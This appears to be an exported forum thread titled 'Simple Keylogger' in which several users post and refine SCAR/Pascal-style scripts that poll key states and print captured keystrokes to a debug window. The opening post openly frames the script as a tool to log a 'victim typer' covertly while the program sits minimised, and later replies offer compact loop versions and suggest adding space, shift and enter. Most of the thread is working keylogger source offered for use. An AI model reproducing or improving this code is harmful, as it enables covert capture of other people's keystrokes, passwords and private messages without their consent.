channel.title: Simple Keylogger

item.title: Simple Keylogger
item.dc:creator: @West7man West7man
item.description:
@West7man wrote:

I made it near perfect 

program kl;
var a: string;
var i: integer;
var ao: string;
var t: integer;
var m: integer;
begin
  a:= 'abcdefghijklmnoprstuvwxyzöäõü1234567890';
  repeat
    for i:= 1 to length(a) do
    begin
      if (ao=a[i]) then
      begin
        if (isKeyDown(a[i])) then
        begin
        if(t=250-m) then
          begin
            WriteLn(a[i]);
            m:=200;
            t:=0;
          end else
          begin
            t:=t+1;
            wait(1)
          end;
        end else
        begin
          ao:='';
          m:=0;
        end;
      end else
        begin
          if (isKeyDown(a[i])) then
          begin
            WriteLn(a[i]);
            ao:=a[i];
            wait(100);
          end;
        end;
      end;
  until(false);
end.

Just add space, shift, enter and you are almost ready with your ultimate keylogger.

It makes it neater and easier to read.

item.title: Simple Keylogger
item.dc:creator: @XxKanexX Kane.
item.description:
@XxKanexX wrote:

[quote=“IP-Drowner, post:10, topic:221487”][quote author=Kane. link=topic=290774.msg2349557#msg2349557 date=1216881294]
Uh, here’s a lesson for improvement…
Instead of of having to do if isKeyDown for the whole alphabet conseuetively, you could do;

var a: string;
var i: integer;
begin
  a:= 'abcdefghijklmnoprstuvwxyz1234567890';
  repeat
    for i:= 1 to length(a) do
    begin
      if (isKeyDown(a[i])) then WriteLn(a[i]);
    end;
    Wait(20);
  until(false);
end.

I’m on a laptop without Scar so i can’t test that, but it should work.
I haven’t coded in a while, though.
[/quote]
Here’s a lesson for improvement Kane.

If the for to do loop only requires to do one line, then you could remove the begin and the ends from it, you could do:

var a: string; var i: integer; begin a:= 'abcdefghijklmnoprstuvwxyz1234567890'; repeat for i:= 1 to length(a) do if (isKeyDown(a[i])) then WriteLn(a[i]); Wait(20); until(false); end.

I’m on a laptop with SCAR so i can test it, and it works
I have coded in a while, too

:p[/quote]
I am aware of that, but it’s my coding style.
It makes it neater and easier to read.

One line for shit is ugly as hell.

Read full topic

item.title: Simple Keylogger
item.dc:creator: @IP-Drowner IP-Drowner
item.description:
@IP-Drowner wrote:

R1ch4y:

Thanks. Instead of just insulting my script, could you give me ways/ a way to improve it?

Do if then begin etc, so you add the wait (25) in that begin.

Example: if(IsKeyDown('a')) then begin Writeln('a'); Wait(25); end;

Read full topic

item.title: Simple Keylogger
item.dc:creator: @R1ch4y R1ch4y
item.description:
@R1ch4y wrote:

This is a script that when you press PLAY, it logs keys that are being pressed.

The keys that it logs are:

a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z (the alphabet)

1, 2, 3, 4, 5, 6, 7, 8, 9, 0

,(comma), ., [, ], -, =, /

This is a simple keylogger, and please note that it register the average typers key rate. If your victim typer is faster than it can register, the letters in the debug box can go all jumbled.

(Copied from script):

To use, simply press Ctrl + M to minimize SCAR into the Task Bar, and press
Ctrl + Alt + R to run the script. Any unwanted visitor’s key pressing will be
logged in the debug box. I believe this still works if you start the script,
then hibernate you PC, and when someone turns on your PC, it is still logging.
However, I have not tried the above myself.

Script (Keylogger):

[code]

program Keylogger;
//By R1ch4 of SRL, GzP, Mopar and now Freddy.

{To use, simply press Ctrl + M to minimize SCAR into the Task Bar, and press
Ctrl + Alt + R to run the script. Any unwanted visitor’s key pressing will be
logged in the debug box. I believe this still works if you start the script,
then hibernate you PC, and when someone turns on your PC, it is still logging.
However, I have not tried the above myself.}

procedure LogKeys;

begin

if (IsKeyDown(‘a’)) then WriteLn(‘a’);

Wait(25);

if (IsKeyDown(‘b’)) then WriteLn(‘b’);

Wait(25);

if (IsKeyDown(‘c’)) then WriteLn(‘c’);

Wait(25);

if (IsKeyDown(‘d’)) then WriteLn(‘d’);

Wait(25);

if (IsKeyDown(‘e’)) then WriteLn(‘e’);

Wait(25);

if (IsKeyDown(‘f’)) then WriteLn(‘f’);

Wait(25);

if (IsKeyDown(‘g’)) then WriteLn(‘g’);

Wait(25);

if (IsKeyDown(‘h’)) then WriteLn(‘h’);

Wait(25);

if (IsKeyDown(‘i’)) then WriteLn(‘i’);

Wait(25);

if (IsKeyDown(‘j’)) then WriteLn(‘j’);

Wait(25);

if (IsKeyDown(‘l’)) then WriteLn(‘l’);

Wait(25);

if (IsKeyDown(‘m’)) then WriteLn(‘m’);

Wait(25);

if (IsKeyDown(‘n’)) then WriteLn(‘n’);

Wait(25);

if (IsKeyDown(‘o’)) then WriteLn(‘o’);

Wait(25);

if (IsKeyDown(‘p’)) then WriteLn(‘p’);

Wait(25);

if (IsKeyDown(‘q’)) then WriteLn(‘q’);

Wait(25);

if (IsKeyDown(‘r’)) then WriteLn(‘r’);

Wait(25);

if (IsKeyDown(‘s’)) then WriteLn(‘s’);

Wait(25);

if (IsKeyDown(‘t’)) then WriteLn(‘t’);

Wait(25);

if (IsKeyDown(‘u’)) then WriteLn(‘u’);

Wait(25);

if (IsKeyDown(‘v’)) then WriteLn(‘v’);

Wait(25);

if (IsKeyDown(‘w’)) then WriteLn(‘w’);

Wait(25);

if (IsKeyDown(‘x’)) then WriteLn(‘x’);

Wait(25);

if (IsKeyDown(‘y’)) then WriteLn(‘y’);

Wait(25);

if (IsKeyDown(‘z’)) then WriteLn(‘z’);

Wait(25);

if (IsKeyDown(’/’)) then WriteLn(’/’);

Wait(25);

if (IsKeyDown(’,’)) then WriteLn(’,’);

Wait(25);

if (IsKeyDown(’.’)) then WriteLn(’.’);

Wait(25);

if (IsKeyDown(’')) then WriteLn('’);

Wait(25);

if (IsKeyDown(’=’)) then WriteLn(’=’);

Wait(25);

if (IsKeyDown(’[’)) then WriteLn(’[’);

Wait(25);

if (IsKeyDown(’]’)) then WriteLn(’]’);

Wait(25);

if (IsKeyDown(’-’)) then WriteLn(’-’);

Wait(25);

if (IsKeyDown(‘0’)) then WriteLn(‘0’);

Wait(25);

if (IsKeyDown(‘1’)) then WriteLn(‘1’);

Wait(25);

if (IsKeyDown(‘2’)) then WriteLn(‘2’);

Wait(25);

if (IsKeyDown(‘3’)) then WriteLn(‘3’);

Wait(25);

if (IsKeyDown(‘4’)) then WriteLn(‘4’);

Wait(25);

if (IsKeyDown(‘5’)) then WriteLn(‘5’);

Wait(25);

if (IsKeyDown(‘6’)) then WriteLn(‘6’);

Wait(25);

if (IsKeyDown(‘7’)) then WriteLn(‘7’);

Wait(25);

if (IsKeyDown(‘8’)) then WriteLn(‘8’);

Wait(25);

if (IsKeyDown(‘9’)) then WriteLn(‘9’);

Wait(25);

end;

begin
repeat
LogKeys;
until(false);

end.[/code]

Now go out there and find out who has been getting you viruses!

Enjoy!

EDIT: Added loop.
